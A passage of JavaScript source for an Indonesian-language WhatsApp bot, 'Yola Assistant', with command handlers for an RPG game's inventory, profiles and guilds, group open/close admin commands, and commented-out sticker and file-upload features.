                    if (!audioUrl) return reply('────୨ Yola Assistant ৎ────\nAudio tidak tersedia untuk video ini.\n────୨ Yola Assistant ৎ────');

                    const caption = `────୨ Yola Assistant ৎ────\n\`Y O U T U B E - P L A Y\`\n\n• Judul: ${title}\n• Channel: ${channel}\n• Durasi: ${duration}\n• Link: ${link}\n• Format: Audio\n────୨ Yola Assistant ৎ────`.trim();

                    await yola.sendMessage(m.chat, {
                        text: caption,
                        contextInfo: {
                            externalAdReply: {
                                title: title,
                                body: 'Play Music 🧸',
                                thumbnailUrl: imageUrl,
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: m });

                    const checkAudio = await fetch(audioUrl, { method: 'HEAD' });
                    if (!checkAudio.ok) return reply('────୨ Yola Assistant ৎ────\nAudio tidak dapat diakses atau link mati.\n────୨ Yola Assistant ৎ────');

                    await yola.sendMessage(m.chat, {
                        audio: { url: audioUrl },
                        mimetype: 'audio/mp4',
                        ptt: false
                    }, { quoted: m });

                } catch (e) {
                    reply(`────୨ Yola Assistant ৎ────\nTerjadi kesalahan saat mengambil atau mengirim audio: ${e.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            */
            case 'inventory':
            case 'inv': {
                // 1. Cek Registrasi
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);
            
                const inventory = userRPG.inventory;
                const playerName = registeredUsers[m.sender].name;
            
                let invText = `📦 **INVENTORY ${playerName.toUpperCase()}** 📦\n\n`;
            
                // 2. Cek apakah inventory kosong
                if (Object.keys(inventory).length === 0) {
                    invText += `_Tas Kakak kosong! Ayo jelajahi dungeon atau beli item di toko._\n`;
                } else {
                    // 3. Loop dan format item
                    // Mengambil semua kunci (ID item) dan mengurutkannya
                    const sortedItemIds = Object.keys(inventory).sort();
            
                    for (const itemId of sortedItemIds) {
                        const quantity = inventory[itemId];
                        const itemData = rpgItems[itemId]; // rpgItems diambil dari ./system/rpgData.js
                        
                        // Mengambil nama item dari rpgItems atau menggunakan ID jika tidak ditemukan
                        const itemName = itemData?.name || capital(itemId.replace(/-/g, ' '));
                        const itemIcon = itemData?.icon || '⭐';
            
                        invText += `${itemIcon} ${itemName} *(x${quantity})*\n`;
                    }
                }
            
                invText += `\n*Ketik ${prefix}use [nama-item] [jumlah] untuk memakai item.*`;
                invText += `\n*Ketik ${prefix}sell [nama-item] [jumlah] untuk menjual item.*`;
                invText += `\n────୨ Yola Assistant ৎ────`;
            
                await reply(invText);
            }
            break;
            case 'profile':
            case 'me':
            case 'status':
            case 'profil': {
                let targetJid = m.sender;
                let targetUserRpgId = null;
                if (q) {
                    try {
                        targetUserRpgId = parseInt(q.replace('@', ''));
                    } catch {}
                    if (!isNaN(targetUserRpgId)) {
                        targetJid = findUserByRPGID(targetUserRpgId);
                        if (!targetJid) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Petualang dengan ID *${targetUserRpgId}* gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                    } else {
                        let mentioned = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                        if (mentioned) {
                            targetJid = mentioned;
                        } else {
                            const potentialJid = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                            let found = false;
                            try {
                                const [result] = await yola.onWhatsApp(potentialJid);
                                if (result?.exists) {
                                    targetJid = result.jid;
                                    found = true;
                                }
                            } catch {}
                            if (!found) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Pengguna "${q}" gak Yola temuin. Coba @tag, ID Petualang, atau nomor WA yaa~\n────୨ Yola Assistant ৎ────`);
                        }
                    }
                }

                const targetData = registeredUsers[targetJid];
                if (!targetData || !targetData.rpg || !targetData.rpg.role) {
                    return reply(targetJid === m.sender ? `────୨ Yola Assistant ৎ────\n🛡️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────` : `────୨ Yola Assistant ৎ────\n🛡️ @${targetJid.split('@')[0]} belum terdaftar sebagai petualang.\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                }

                const rpg = targetData.rpg;
                 const currentStats = calculateStats(rpg);

                const rpgId = targetData.rpgId;
                const roleData = availableRolesData[rpg.role];
                const nextLevelXP = xpForNextLevel(rpg.level);
                const weapon = rpg.equipment?.weapon ? rpgItems[rpg.equipment.weapon] : null;
                const armor = rpg.equipment?.armor ? rpgItems[rpg.equipment.armor] : null;
                const shield = rpg.equipment?.shield ? rpgItems[rpg.equipment.shield] : null;
                const spouseJid = rpg.spouse;
                let spouseName = "Masih jomblo nih... Semangat cari pasangan! <3";
                let mentionedSpouse = [];
                if (spouseJid) {
                    const targetSpouse = registeredUsers[spouseJid];
                    if (targetSpouse && targetSpouse.rpgId) {
                        spouseName = `@${spouseJid.split('@')[0]} ❤️ (ID: ${targetSpouse.rpgId})`;
                        mentionedSpouse.push(spouseJid);
                    } else {
                        spouseName = `Menikah dengan ID: ${spouseJid} (Tapi datanya gak ketemu nih...)`;
                        rpg.spouse = null;
                        saveUsers(targetJid);
                    }
                }

                const partyName = rpg.partyId && parties[rpg.partyId] ? parties[rpg.partyId].name || `Party ID ${rpg.partyId.split('_')[1]}` : "Belum punya party";
                const guildName = rpg.guildId && guilds[rpg.guildId] ? guilds[rpg.guildId].name || `Guild ID ${rpg.guildId}` : "Belum punya guild";
                const houseName = rpg.houseId && rpgHouses[rpg.houseId] ? rpgHouses[rpg.houseId].name : "Masih jadi gelandangan... Ehehe";
                const jobName = rpg.currentJob && rpgJobs[rpg.currentJob] ? rpgJobs[rpg.currentJob].name : "Lagi nganggur nih";

                let profileText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ 🌟 *Profil Petualang Milik ${targetData.name}* 🌟\n│✧\n│✧ *Nama:* ${targetData.name}\n│✧ *ID RPG:* ${rpgId}\n│✧ *Usia:* ${targetData.age}\n│✧ *Gender:* ${capital(targetData.gender || '?')} ${targetData.gender === 'pria' ? '♂️' : targetData.gender === 'wanita' ? '♀️' : ''}\n│✧ *Peran:* ${capital(rpg.role)} ${roleData?.icon || ''}\n│✧ *Rank:* ${getRankByTotalXp(rpg.totalXpEarned) || 'G'}\n│✧ *Level:* ${rpg.level || 1}\n│✧ *XP Saat Ini:* ${toRupiah(rpg.xp || 0)} / ${toRupiah(nextLevelXP)}\n│✧ *Total XP Didapat:* ${toRupiah(rpg.totalXpEarned || 0)}\n│✧\n│✧ ❤️ *HP:* ${currentStats.hp} / ${currentStats.maxHp}\n│✧ 💧 *MP:* ${currentStats.mp} / ${currentStats.maxMp}\n│✧ ⚔️ *ATK:* ${currentStats.atk}\n│✧ 🛡️ *DEF:* ${currentStats.def}\n│✧\n│✧ 💰 *Uang:* ${formatCurrency(rpg.currency)}\n│✧\n│✧ *⚔️ Equipment yang Dipakai:*\n│✧   ┣ *Senjata:* ${weapon ? `${weapon.name} (ID: \`${rpg.equipment.weapon}\`)` : '-'}\n│✧   ┣ *Zirah:* ${armor ? `${armor.name} (ID: \`${rpg.equipment.armor}\`)` : '-'}\n│✧   ┗ *Perisai:* ${shield ? `${shield.name} (ID: \`${rpg.equipment.shield}\`)` : '-'}\n│✧\n│✧ 💍 *Pasangan:* ${spouseName}\n│✧ 👨‍👩‍👧‍👦 *Party:* ${partyName}\n│✧ 🏰 *Guild:* ${guildName}\n│✧ 🏡 *Rumah:* ${houseName}\n│✧ 💼 *Pekerjaan:* ${jobName}\n│✧ 📜 *Lisensi Petualang:* ${rpg.license ? '✅ Punya dong!' : '❌ Aduh, belum punya nih...'}\n│✧ 📅 *Terdaftar Sejak:* ${new Date(targetData.registeredDate).toLocaleDateString('id-ID')}`;

                if (rpg.currentAction) {
                    const actionName = rpg.currentAction.type.replace(/_/g, ' ').trim();
                    const timeStarted = new Date(rpg.currentAction.startTime).toLocaleTimeString('id-ID');
                    const timeEnd = new Date(rpg.currentAction.endTime).toLocaleTimeString('id-ID');
                    const remaining = rpg.currentAction.endTime - Date.now();
                    profileText += `\n│✧\n│✧ ⏳ *Status Aksi:* Lagi ${capital(actionName)} (Mulai: ${timeStarted}, Selesai: ${timeEnd}). ${Math.max(0, Math.ceil(remaining/1000))} detik lagi selesai~`;
                } else if (rpg.pendingAction) {
                    const pendingActionName = rpg.pendingAction.type.replace(/_pending/g, ' ').trim();
                    profileText += `\n│✧\n│✧ ⏱️ *Status Aksi:* Lagi nunggu buat mulai ${capital(pendingActionName)}. Gunakan *${prefix}${pendingActionName.split(' ')[0]}start* untuk memulai.`;
                }
                profileText += `\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

                let pfpUrl = DEFAULT_PFP_URL;
                let preparedHeaderMedia = null;
                try {
                    pfpUrl = await yola.profilePictureUrl(targetJid, 'image');
                    if (!pfpUrl) pfpUrl = MENU_THUMBNAILS.profile || getRandomThumbnailUrl();
                    preparedHeaderMedia = await prepareWAMessageMedia({
                        image: {
                            url: pfpUrl
                        }
                    }, {
                        upload: yola.waUploadToServer
                    });
                } catch (err) {
                    try {
                        preparedHeaderMedia = await prepareWAMessageMedia({
                            image: {
                                url: MENU_THUMBNAILS.profile || getRandomThumbnailUrl()
                            }
                        }, {
                            upload: yola.waUploadToServer
                        });
                    } catch {
                        preparedHeaderMedia = null;
                    }
                }
                const messageOptions = {
                    contextInfo: {
                        mentionedJid: [targetJid, ...mentionedSpouse],
                        externalAdReply: defaultContextInfoBuilder(targetData.name, 'profile').externalAdReply
                    }
                };
                if (preparedHeaderMedia?.imageMessage) {
                    messageOptions.image = preparedHeaderMedia.imageMessage;
                    messageOptions.caption = profileText;
                } else {
                    messageOptions.text = profileText;
                }
                try {
                    await yola.sendMessage(m.chat, messageOptions, {
                        quoted: m
                    });
                } catch (sendErr) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal nampilin profilnya: ${sendErr.message || 'Error gak jelas nih...'}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;

            case 'guildinfo': {
                let targetGuildId = userRPG.guildId;
                if (q) {
                    const parsedId = parseInt(q);
                    if (!isNaN(parsedId)) {
                        targetGuildId = parsedId;
                    } else {
                        // Attempt to find by name
                        const foundGuild = Object.values(guilds).find(g => g.name.toLowerCase() === q.toLowerCase());
                        if (foundGuild) {
                            targetGuildId = foundGuild.id;
                        } else {
                            return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Guild dengan ID atau nama "${q}" gak Yola temuin.\n────୨ Yola Assistant ৎ────`);
                        }
                    }
                }

                if (!targetGuildId) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak belum gabung di Guild mana-mana atau tidak menyebutkan ID Guild. Gunakan *${prefix}guildinfo [ID/Nama Guild]*.\n────୨ Yola Assistant ৎ────');

                const guild = guilds[targetGuildId];
                if (!guild) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Guild dengan ID *${targetGuildId}* gak Yola temuin.\n────୨ Yola Assistant ৎ────`);

                const leaderData = registeredUsers[guild.leader];
                const leaderName = leaderData?.name || `@${guild.leader.split('@')[0]}`;
                let memberList = guild.members.map(jid => {
                    const memberData = registeredUsers[jid];
                    return `│✧  - ${memberData?.name || `@${jid.split('@')[0]}`} (ID: ${memberData?.rpgId || '?'}) ${jid === guild.leader ? '👑' : ''}`;
                }).join('\n');

                let guildInfoText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ 🏰 *Informasi Guild: ${guild.name}* (ID: ${guild.id}) 🏰\n│✧\n│✧ *Leader:* ${leaderName}\n│✧ *Anggota (${guild.members.length}/${GUILD_MAX_MEMBERS}):*\n${memberList}\n│✧\n│✧ *Permintaan Bergabung (${guild.requests.length}):*`;
                if (guild.requests.length > 0) {
                    guildInfoText += '\n│✧  - ' + guild.requests.map(jid => {
                        const reqUser = registeredUsers[jid];
                        return `${reqUser?.name || `@${jid.split('@')[0]}`} (ID: ${reqUser?.rpgId || '?'})`;
                    }).join('\n│✧  - ');
                } else {
                    guildInfoText += ' _(Tidak ada permintaan pending)_';
                }
                guildInfoText += `\n│✧\n│✧ *Poin Guild:* ${guild.points || 0}\n│✧ *Dibuat:* ${new Date(guild.createdAt).toLocaleDateString('id-ID')}\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

                await reply(`${guildInfoText}`, {
                    mentions: [guild.leader, ...guild.members, ...guild.requests]
                });
            }
            break;

            case 'myguild': {
                if (!userRPG.guildId) return reply('────୨ Yola Assistant ৎ────\n🛡️ Kakak belum gabung di Guild mana-mana. Gunakan *${prefix}createguild* untuk membuat atau *${prefix}joinguild* untuk bergabung.\n────୨ Yola Assistant ৎ────');
                
                const guild = guilds[userRPG.guildId];
                if (!guild) { // Should not happen if userRPG.guildId exists, but for safety
                    userRPG.guildId = null;
                    saveUsers(m.sender);
                    return reply('────୨ Yola Assistant ৎ────\n❌ Aduh, data Guild Kakak gak ketemu nih... Status Guild Kakak Yola reset ya.\n────୨ Yola Assistant ৎ────');
                }
                
                // Reuse guildinfo logic
                const leaderData = registeredUsers[guild.leader];
                const leaderName = leaderData?.name || `@${guild.leader.split('@')[0]}`;
                let memberList = guild.members.map(jid => {
                    const memberData = registeredUsers[jid];
                    return `│✧  - ${memberData?.name || `@${jid.split('@')[0]}`} (ID: ${memberData?.rpgId || '?'}) ${jid === guild.leader ? '👑' : ''}`;
                }).join('\n');

                let guildInfoText = `┌── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ 🏰 *Informasi Guild: ${guild.name}* (ID: ${guild.id}) 🏰\n│✧\n│✧ *Leader:* ${leaderName}\n│✧ *Anggota (${guild.members.length}/${GUILD_MAX_MEMBERS}):*\n${memberList}\n│✧\n│✧ *Permintaan Bergabung (${guild.requests.length}):*`;
                if (guild.requests.length > 0) {
                    guildInfoText += '\n│✧  - ' + guild.requests.map(jid => {
                        const reqUser = registeredUsers[jid];
                        return `${reqUser?.name || `@${jid.split('@')[0]}`} (ID: ${reqUser?.rpgId || '?'})`;
                    }).join('\n│✧  - ');
                } else {
                    guildInfoText += ' _(Tidak ada permintaan pending)_';
                }
                guildInfoText += `\n│✧\n│✧ *Poin Guild:* ${guild.points || 0}\n│✧ *Dibuat:* ${new Date(guild.createdAt).toLocaleDateString('id-ID')}\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

                await reply(`${guildInfoText}`, {
                    mentions: [guild.leader, ...guild.members, ...guild.requests]
                });
            }
            break;

            case 'yolarpg': {
                if (!isRegistered) return reply(`────୨ Yola Assistant ৎ────\n⚔️ Kakak belum terdaftar nih! Yuk daftar dulu pakai *${prefix}daftar nama.umur*\n────୨ Yola Assistant ৎ────`);
                if (!text) return reply(`────୨ Yola Assistant ৎ────\n❓ Mau tanya apa sama Yola seputar RPG, Kak ${pushname}?\n────୨ Yola Assistant ৎ────`);
                
                const userRPGData = registeredUsers[m.sender];
                let questionText = text;

                // Define a specific RPG-focused prompt for Yola AI
                const rpgSpecificPrompt = `Anda adalah Yola Assistant, AI yang sangat membantu dan ahli di bidang game RPG yang sedang dimainkan pengguna. Nama Anda Yola. Pengguna Anda adalah Kak ${userRPGData.name || pushname}. Anda harus menjawab pertanyaan pengguna tentang fitur RPG di bot ini (${rpgCommands.join(', ')}). Jawaban Anda harus ` + '`' + `lengkap` + '`' + `, ` + '`' + `detail` + '`' + `, ` + '`' + `rapi` + '`' + `, terstruktur dengan baik, dan menggunakan bahasa Indonesia yang baik dan benar. Tekankan ` + '`' + `poin-poin penting` + '`' + ` dalam jawaban Anda dengan membungkusnya dalam tanda petik tunggal terbalik (backtick), misalnya ` + '`' + `seperti ini` + '`' + `. Berikan contoh perintah jika relevan (prefix bot saat ini adalah: '${prefix}'). JANGAN gunakan '||' untuk memisahkan pesan. Hasilkan satu balasan yang koheren.`;

                // Call the general AI function with the specific RPG prompt
                await callYolaAI(yola, m, questionText, pushname, userRPGData, prefix, reply, null, null, rpgSpecificPrompt);
            }
            break;

            /*case 'sticker':
            case 'stiker':
            case 'sgif':
            case 's': {
                const mediaMessageToProcess = m.quoted ? m.quoted : m;
                const effectiveMime = (mediaMessageToProcess.msg || mediaMessageToProcess)?.mimetype || '';

                if (!/image|video/.test(effectiveMime)) {
                    return reply(`────୨ Yola Assistant ৎ────\n❓ Reply atau kirim foto/video yang mau dijadiin stiker dong, Kak ${pushname}~\n────୨ Yola Assistant ৎ────`);
                }

                if (/video/.test(effectiveMime)) {
                    const msgSeconds = mediaMessageToProcess.message?.videoMessage?.seconds;
                    if (msgSeconds && msgSeconds > 15) {
                        return reply("────୨ Yola Assistant ৎ────\n⏳ Video buat stiker maksimal 15 detik aja yaa~\n────୨ Yola Assistant ৎ────");
                    }
                }
                reply("────୨ Yola Assistant ৎ────\n⏳ Oke! Yola bikinin stikernya... Sebentar yaa~\n────୨ Yola Assistant ৎ────");
                let mediaPathSticker = null;
                try {
                    mediaPathSticker = await yola.downloadAndSaveMediaMessage(mediaMessageToProcess.msg || mediaMessageToProcess);
                    if (!mediaPathSticker || !fs.existsSync(mediaPathSticker)) {
                        throw new Error("Gagal mengunduh media untuk stiker.");
                    }

                    const stickerInstance = new Sticker(mediaPathSticker, {
                        pack: `Yola Asisten ❤️`,
                        author: `ThanDz © ${new Date().getFullYear()}`,
                        type: effectiveMime.startsWith('image') ? "full" : "full",
                        quality: 50,
                        categories: ["cute", "fun"],
                    });
                    await yola.sendMessage(m.chat, await stickerInstance.toMessage(), {
                        quoted: m
                    });

                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal bikin stikernya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                } finally {
                    if (mediaPathSticker && fs.existsSync(mediaPathSticker)) {
                        try {
                            fs.unlinkSync(mediaPathSticker);
                        } catch (unlinkErr) {}
                    }
                }
            }
            break;
            case 'brati': {
                if (!text) return reply(`────୨ Yola Assistant ৎ────\nTeks buat stiker Brat-nya mana nih, Kak ${pushname}? Yola tungguin yaa~ 😉\n────୨ Yola Assistant ৎ────`);

                async function generateBratImage(txt) {
                    try {
                        const res = await axios.get("https://api.nekorinn.my.id/maker/brat-v2", {
                            params: {
                                text: txt
                            },
                            responseType: "arraybuffer"
                        });
                        const imageBuffer = Buffer.from(res.data);
                        if (imageBuffer.length <= 1024) {
                            throw new Error("Gambar yang dihasilkan terlalu kecil atau API gagal.");
                        }
                        return imageBuffer;
                    } catch (e) {
                        throw new Error(e.message || "Gagal menghubungi API Brat nih, Kak.");
                    }
                }

                try {
                    await reply(`────୨ Yola Assistant ৎ────\nOke deh! Yola lagi bikinin stiker Brat gambarnya buat Kakak ${pushname}... Sebentar yaa, ini agak spesial lho! 🎨\n────୨ Yola Assistant ৎ────`);
                    const imageBuffer = await generateBratImage(text);

                    const tempFilePath = path.join(TMP_DIR, `brati_${Date.now()}.png`);
                    fs.writeFileSync(tempFilePath, imageBuffer);

                    const sticker = new Sticker(tempFilePath, {
                        pack: `Yola Brat Pack 🎀`,
                        author: `Yola Asisten 💖`,
                        type: "full",
                        categories: ['yola', 'brat', 'cute', '🌸'],
                        quality: 80
                    });

                    await yola.sendMessage(m.chat, await sticker.toMessage(), {
                        quoted: m
                    });

                    try {
                        fs.unlinkSync(tempFilePath);
                    } catch (unlinkErr) {}

                } catch (e) {
                    reply(`────୨ Yola Assistant ৎ────\nAduuh, maaf ya Kak ${pushname}... Yola gagal bikin stiker Brat-nya nih. 😢 Errornya: ${e.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'bratv':
            case 'bratvideo': {
                let bratvText = text;
                if (!bratvText) {
                    bratvText = `Yola Suka Kakak ${pushname}!`;
                    await reply(`────୨ Yola Assistant ৎ────\nKarena teksnya kosong, Yola bikinin yang spesial yaa, Kak ${pushname}~ 😉\n────୨ Yola Assistant ৎ────`);
                }

                try {
                    await reply(`────୨ Yola Assistant ৎ────\nSiap! Yola lagi proses stiker Brat video-nya nih buat Kakak ${pushname}... Ini mungkin agak lama, jadi sabar yaa~ 🎬✨\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "⏳",
                            key: m.key
                        }
                    });
                    const apiUrl = `https://api.ryuu-dev.offc.my.id/tools/brat?text=${encodeURIComponent(teks)}&apikey=RyuuGanteng`;
                    const response = await axios.get(apiUrl, {
                        responseType: 'arraybuffer'
                    });

                    if (!response.data || response.data.byteLength < 10240) {
                        throw new Error("API tidak mengembalikan video yang valid atau videonya terlalu kecil.");
                    }

                    const tempFilePath = path.join(TMP_DIR, `bratv_${Date.now()}.mp4`);
                    fs.writeFileSync(tempFilePath, response.data);

                    const sticker = new Sticker(tempFilePath, {
                        pack: `Yola BratV 🎬`,
                        author: `Yola Asisten 💖`,
                        type: "full",
                        categories: ["yola", "bratv", "animated", "cute", "💖"],
                        quality: 40
                    });

                    await yola.sendMessage(m.chat, await sticker.toMessage(), {
                        quoted: m
                    });
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "✅",
                            key: m.key
                        }
                    });

                    try {
                        fs.unlinkSync(tempFilePath);
                    } catch (unlinkErr) {}

                } catch (e) {
                    let errorMessage = e.message;
                    if (e.response && e.response.status) {
                        errorMessage = `API Error: Status ${e.response.status}`;
                    }
                    reply(`────୨ Yola Assistant ৎ────\nYah, maaf banget Kak ${pushname}... 😭 Kayaknya servernya lagi sibuk atau ada error pas Yola bikinin stiker Brat videonya. Coba lagi nanti yaa! Detail: ${errorMessage}\n────୨ Yola Assistant ৎ────`);
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "❌",
                            key: m.key
                        }
                    });
                }
            }
            break;
            case 'brat': {
                if (!text) return reply(`────୨ Yola Assistant ৎ────\nTeksnya apa nih buat stiker Brat-nya, Kak ${pushname}? Biar Yola bikinin yang imut! 😉\n────୨ Yola Assistant ৎ────`);

                let bratMessage = `────୨ Yola Assistant ৎ────\nStiker Brat buat Kakak ${pushname}!\n\nMau yang gambar biasa atau yang video nih? Pilih yaa~ 👇\n────୨ Yola Assistant ৎ────`;
                let buttonsBrat = [{
                    buttonId: `${prefix}brati ${text}`,
                    buttonText: {
                        displayText: '🖼️ Brat Gambar'
                    },
                    type: 1
                }, {
                    buttonId: `${prefix}bratv ${text}`,
                    buttonText: {
                        displayText: '🎬 Brat Video'
                    },
                    type: 1
                }];

                if (currentMenuStyle === 'V1') {
                    let buttonMessageBrat = {
                        text: bratMessage,
                        footer: 'Yola Asisten ✨',
                        buttons: buttonsBrat,
                        headerType: 1,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    };
                    await yola.sendMessage(m.chat, buttonMessageBrat, {
                        quoted: m
                    });
                } else {
                    await reply(`${bratMessage}\n\nAtau ketik aja langsung:\n • \`${prefix}brati ${text}\`\n • \`${prefix}bratv ${text}\``, defaultContextInfoBuilder(pushname, command));
                }
            }
            break;

            case 'tourl': {
                let targetMessage = null;
                let targetMime = '';
                let originalFilename = 'upload_yola';
                if (m.quoted) {
                    targetMessage = m.quoted;
                    targetMime = (targetMessage.msg || targetMessage)?.mimetype || '';
                    originalFilename = targetMessage.message?.documentMessage?.fileName || targetMessage.message?.imageMessage?.fileName || targetMessage.message?.videoMessage?.fileName || targetMessage.message?.audioMessage?.fileName || originalFilename;
                } else if (/imageMessage|videoMessage|audioMessage|documentMessage/.test(m.mtype)) {
                    targetMessage = m;
                    targetMime = (m.message.imageMessage || m.message.videoMessage || m.message.audioMessage || m.message.documentMessage)?.mimetype || '';
                    originalFilename = m.message?.documentMessage?.fileName || m.message?.imageMessage?.fileName || m.message?.videoMessage?.fileName || m.message?.audioMessage?.fileName || originalFilename;
                } else {
                    return reply(`────୨ Yola Assistant ৎ────\n❓ Reply atau kirim media yang mau diupload dong, Kak ${pushname}~\n────୨ Yola Assistant ৎ────`);
                }
                if (!/image|video|audio|document/.test(targetMime) && !targetMime.startsWith('application')) {
                    if (!['application/pdf', 'application/zip', 'application/vnd.android.package-archive', 'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/vnd.ms-excel', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.ms-powerpoint', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'text/plain', 'text/csv'].includes(targetMime)) {
                        return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Tipe file \`${targetMime}\` kayaknya gak bisa Yola upload deh.\n────୨ Yola Assistant ৎ────`);
                    }
                }
                reply("────୨ Yola Assistant ৎ────\n⏳ Oke! Yola lagi upload medianya... Sebentar yaa~\n────୨ Yola Assistant ৎ────");
                let mediaPathToUrl = null;
                try {
                    mediaPathToUrl = await yola.downloadAndSaveMediaMessage(targetMessage);
                    if (!mediaPathToUrl || !fs.existsSync(mediaPathToUrl)) throw new Error("Gagal mengunduh media untuk diupload.");
                    let responseUrl = await CatBox(mediaPathToUrl);
                    let fileSize = (fs.statSync(mediaPathToUrl).size / 1024).toFixed(2);
                    let uploadDate = new Date().toLocaleString("id-ID");
                    let uploader = `${pushname || m.sender.split('@')[0]}`;
                    let teks = `────୨ Yola Assistant ৎ────\n✨ *Upload Sukses by Yola!* ✨\n\n`;
                    teks += `📁 Nama File: ${originalFilename}\n`;
                    teks += `📦 Tipe File: ${targetMime}\n`;
                    teks += `💾 Ukuran File: ${fileSize} KB\n`;
                    teks += `👤 Diupload oleh: ${uploader}\n`;
                    teks += `📅 Tanggal Upload: ${uploadDate}\n\n`;
                    teks += `🔗 *Ini URL-nya:* ${responseUrl}\n────୨ Yola Assistant ৎ────`;

                    if (currentMenuStyle === 'V1') {
                        let msgii = await generateWAMessageFromContent(m.chat, {
                            viewOnceMessage: {
                                message: {
                                    messageContextInfo: {
                                        deviceListMetadata: {},
                                        deviceListMetadataVersion: 2,
                                        ...(defaultContextInfoBuilder(pushname, command).externalAdReply ? {
                                            externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                                        } : {})
                                    },
                                    interactiveMessage: proto.Message.InteractiveMessage.create({
                                        body: proto.Message.InteractiveMessage.Body.create({
                                            text: teks
                                        }),
                                        footer: proto.Message.InteractiveMessage.Footer.create({
                                            text: "Yola Asisten by ThanDz"
                                        }),
                                        header: proto.Message.InteractiveMessage.Header.create({
                                            title: "📤 Upload Selesai! 📤",
                                            hasMediaAttachment: false
                                        }),
                                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                            buttons: [{
                                                name: "cta_copy",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "📋 Salin URL-nya",
                                                    id: `copy_code_${makeid}`,
                                                    copy_code: responseUrl
                                                })
                                            }, {
                                                name: "cta_url",
                                                buttonParamsJson: JSON.stringify({
                                                    display_text: "🔗 Buka URL-nya",
                                                    url: responseUrl,
                                                    merchant_url: responseUrl
                                                })
                                            }]
                                        })
                                    })
                                }
                            }
                        }, {
                            userJid: m.sender,
                            quoted: m
                        });
                        await yola.relayMessage(m.chat, msgii.message, {
                            messageId: msgii.key.id
                        });
                    } else {
                        await reply(`${teks}`, defaultContextInfoBuilder(pushname, command));
                    }
                } catch (err) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal uploadnya: ${err.message}\n────୨ Yola Assistant ৎ────`);
                } finally {
                    if (mediaPathToUrl && fs.existsSync(mediaPathToUrl)) {
                        try {
                            fs.unlinkSync(mediaPathToUrl);
                        } catch {}
                    }
                }
            }
            break;*/

            case 'handle_copy_code': {
                 // Do nothing, buttons should not trigger AI, this is just for internal handling
            }
            break;

            case 'close':
            case 'clc': {
                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Admin atau Owner Yola yang boleh.\n────୨ Yola Assistant ৎ────');
                if (!m.isBotAdmin) return reply('────୨ Yola Assistant ৎ────\n🤖 Aduh, Yola bukan Admin di sini... Jadi gak bisa tutup grupnya.\n────୨ Yola Assistant ৎ────');
                try {
                    await yola.groupSettingUpdate(m.chat, 'announcement');
                    reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Grupnya udah Yola tutup! Sekarang cuma Admin yang bisa kirim pesan. 😉\n────୨ Yola Assistant ৎ────`);
                } catch (e) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal tutup grupnya: ${e.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'open':
            case 'opc': {
                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh.\n────୨ Yola Assistant ৎ────');
                if (!m.isBotAdmin) return reply('────୨ Yola Assistant ৎ────\n🤖 Aduh, Yola bukan Admin di sini... Jadi gak bisa buka grupnya.\n────୨ Yola Assistant ৎ────');
                try {
                    await yola.groupSettingUpdate(m.chat, 'not_announcement');
                    reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Grupnya udah Yola buka! Sekarang semua bisa ngobrol lagi~ Seru! >_<\n────୨ Yola Assistant ৎ────`);
                } catch (e) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal buka grupnya: ${e.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'kick':
            case 'tendang': {
